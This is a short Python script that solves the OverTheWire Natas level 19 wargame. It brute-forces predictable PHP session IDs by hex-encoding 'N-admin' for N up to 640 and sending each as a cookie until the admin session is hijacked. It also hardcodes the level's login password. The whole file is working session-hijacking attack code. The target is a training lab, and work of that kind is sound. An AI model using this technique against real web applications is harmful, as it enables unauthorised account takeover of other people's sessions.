#!/bin/python3
# Description: Script to brute-force none sequential session IDs

import requests

from requests.auth import HTTPBasicAuth

# initialize variables
url = 'http://natas19.natas.labs.overthewire.org/'
auth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
data = {"username": "admin", "password": ""}
defstring = "You are logged in as a regular user"

# uncomment to see how session IDs are generated
# for i in range(5):
#     s = requests.Session()
#     r = s.post(url, data=data, auth=auth)
#     # get cookie header
#     cookie = r.headers['Set-Cookie']
#     print(cookie.split(";")[0])

# brute-force session IDs
for i in range(0, 641):
    cookie = dict(PHPSESSID=(str(i) + '-admin').encode("utf-8").hex())

    r = requests.get(url, auth=auth, cookies=cookie)

    if defstring in r.text:
        print("Trying session ID: %d" % i, end="\r")
    else:
        print("\nFound session ID: %d" % i)
        print(r.text)
        break
